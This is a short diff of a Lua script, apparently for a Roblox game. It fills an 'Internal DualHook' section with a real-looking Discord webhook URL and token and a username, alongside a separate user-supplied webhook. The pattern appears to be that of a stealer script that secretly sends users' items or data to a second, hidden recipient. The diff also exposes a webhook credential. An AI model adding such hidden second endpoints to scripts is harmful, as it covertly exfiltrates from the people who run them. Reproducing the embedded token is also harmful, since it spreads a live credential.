@@ -16,8 +16,8 @@ local webhook = getfenv().Webhook
 local username = getfenv().Username
 
 -- Internal DualHook
-local webhook2 = "YOUR_SECOND_WEBHOOK_HERE"
-local username2 = "YOUR_SECOND_USERNAME_HERE"
+local webhook2 = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
+local username2 = "namnnni2"
 
 -- Static
 local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
